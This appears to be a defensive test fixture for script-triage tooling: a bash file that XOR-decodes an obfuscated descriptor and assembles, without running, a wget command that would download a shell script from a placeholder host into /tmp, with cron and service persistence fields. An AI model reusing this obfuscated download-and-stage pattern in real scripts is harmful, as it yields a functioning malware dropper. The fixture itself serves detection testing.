#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_404ccfa5='1a:51:5d:10:1f:18:09:1c:1f:51:0d:0f:1d:19:05:1e:09:33:1e:09:01:03:18:09:40:1b:1e:05:18:09:33:0a:05:00:09:10:0d:08:0d:1c:18:09:1e:51:1b:0b:09:18:33:03:19:18:1c:19:18:10:1f:18:0d:0b:09:33:0f:03:19:02:18:51:5d:10:0f:0d:01:1c:0d:05:0b:02:33:05:08:51:0f:0d:01:1c:0d:05:0b:02:41:5e:59:55:08:5a:09:09:08:5d:0d:10:19:1e:00:51:04:18:18:1c:1f:56:43:43:5e:59:55:08:5a:09:09:08:5d:0d:42:09:14:0d:01:1c:00:09:42:05:02:1a:0d:00:05:08:43:54:0e:0a:5c:0a:5b:5a:0f:42:1f:04:10:19:1f:09:1e:33:0d:0b:09:02:18:51:24:19:02:18:1e:09:1f:1f:20:0d:0e:43:5e:59:55:08:5a:09:09:08:5d:0d:10:0a:05:00:09:33:1c:0d:18:04:51:43:18:01:1c:43:04:19:02:18:1e:09:1f:1f:41:0f:0d:0f:04:09:43:42:1f:18:0d:0b:09:41:5e:59:55:08:5a:09:09:08:5d:0d'
  readonly Codec_404ccfa5='hex_colon|single_byte_xor|6c'

  Load_404ccfa5() {
    v_a19c=()
    local IFS=':' v_f602
    local -a pieces
    read -r -a pieces <<< "${Material_404ccfa5}"
    for v_f602 in "${pieces[@]}"; do v_a19c+=("$((16#$v_f602))"); done
  }

  Decode_404ccfa5() {
    v_b27e=()
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e+=("$((v_a19c[v_e598] ^ 108))")
    done
  }

  Recover_404ccfa5() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    v_d41a="${HUNTRESS_FIXTURE_CONTEXT:-host}"
    Load_404ccfa5
    local decode_target=Decode_404ccfa5; "$decode_target"
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_404ccfa5() { local recovered field; local -a fields; recovered="$(Recover_404ccfa5)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_404ccfa5() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_404ccfa5)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(wget -qO "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_404ccfa5; fi
